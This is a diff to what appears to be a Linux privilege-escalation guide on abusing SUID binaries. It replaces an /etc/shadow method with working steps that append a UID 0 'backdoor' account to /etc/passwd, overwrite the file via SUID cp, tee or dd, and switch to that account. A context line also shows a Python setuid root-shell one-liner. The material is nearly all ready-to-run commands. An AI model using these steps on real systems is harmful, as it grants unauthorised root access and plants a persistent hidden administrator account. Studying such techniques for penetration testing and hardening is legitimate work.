@@ -68,28 +68,40 @@ python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 ## Exploiting SUID via File Overwrite
 
-If `cp` or `tar` has SUID, overwrite `/etc/shadow`:
+If `cp`, `tee`, `dd`, or another file-writing binary has SUID, overwrite `/etc/passwd` to inject a root account.
 
-1. Generate a new password hash:
-
-    ```bash
-    openssl passwd -1 -salt xyz P@ssw0rd
-    ```
-
-2. Copy and modify `/etc/shadow`:
+1. Read the current passwd file:
 
     ```bash
-    cp /etc/shadow /tmp/shadow.bak
+    cat /etc/passwd > /tmp/passwd.new
     ```
 
-3. Replace `/etc/shadow` with modified version:
+2. Generate a password hash and append a UID 0 account:
 
     ```bash
-    cp /tmp/shadow.bak /etc/shadow
+    openssl passwd -1 -salt salt P@ssw0rd
+    # Paste the output into a new line:
+    echo 'backdoor:$1$salt$<hash>:0:0:root:/root:/bin/bash' >> /tmp/passwd.new
     ```
 
-4. Switch to root:
+3. Overwrite `/etc/passwd` using the SUID binary:
 
     ```bash
-    su root
+    # If cp has SUID
+    cp /tmp/passwd.new /etc/passwd
+
+    # If tee has SUID
+    tee /etc/passwd < /tmp/passwd.new
+
+    # If dd has SUID
+    dd if=/tmp/passwd.new of=/etc/passwd
     ```
+
+4. Switch to the injected account:
+
+    ```bash
+    su backdoor
+    ```
+
+!!! tip "Why /etc/passwd, not /etc/shadow"
+    Modifying `/etc/shadow` only works if `/etc/passwd` still points at it. Writing a hash directly into `/etc/passwd` (the second field) is the more portable primitive — Linux falls back to it when `/etc/shadow` doesn't contain the user.
